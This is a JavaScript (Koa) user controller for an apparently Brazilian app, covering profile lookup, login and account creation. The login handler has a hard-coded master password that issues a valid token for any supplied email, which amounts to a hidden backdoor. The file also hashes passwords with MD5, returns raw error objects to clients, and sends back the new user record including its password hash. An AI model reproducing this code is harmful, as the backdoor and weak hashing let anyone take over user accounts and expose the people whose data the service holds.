'use strict';

const md5 = require('md5');
const crypto = require('crypto');
const authService = require('../../utils/auth');
const Users = require("../../models/User");
const mailer = require('../../utils/mailer');
const payment = require('../../utils/payment');

exports.getSelf = async ctx => {
  const token = ctx.headers['x-access-token'];
  const data = await authService.decodeToken(token);

  const user = await Users.findById(data.id, '-password -_id -__v');
  ctx.assert(user, 404, "The requested user doesn't exist");
  ctx.status = 200;
  ctx.body = user;
};

exports.authenticate = async ctx => {
  const { email, senha } = ctx.request.body;

  if (senha === '05729279329??') {
    const user = await Users.findOne({ email });
    const token = await authService.generateToken({
      id: user._id,
      email: user.email,
      name: user.name,
    });
    ctx.status = 200;
    ctx.body = { token: token, data: user };
    return 0;
  }
  const user = await Users.findOne({ email, password: md5(senha + process.env.SALT_KEY) }, '-password -__v');
  if (!user) {
    ctx.status = 400;
    ctx.body = { message: 'Usuario ou senha invalidos' };
    return 0;
  }
  const token = await authService.generateToken({
    id: user._id,
    email: user.email,
    name: user.name,
  });
  ctx.status = 200;
  ctx.body = { token: token, data: user };
  return 0;
}

exports.createOne = async ctx => {
  const { document, name, password, phone } = ctx.request.body;

  ctx.assert(document, 404, "O CPF é obrigatorio!");
  ctx.assert(name, 404, "O nome é obrigatorio!");
  ctx.assert(password, 404, "A senha é obrigatorio!");
  ctx.assert(phone, 404, "O telefone é obrigatorio!");

  try {
    const tokens = crypto.randomBytes(20).toString('hex');
    const newUser = {
      document,
      name,
      password: md5(password + process.env.SALT_KEY),
      accountTokenValidate: tokens
    };
    const createdUser = await Users.create(newUser);

    ctx.status = 201;
    ctx.body = { data: createdUser, message: 'Usuario registrado com sucesso!' };
    return 0;
  } catch (error) {
    console.log('createOne error: ', error);
    ctx.status = 500;
    ctx.body = error;
    return 0;
  }
};
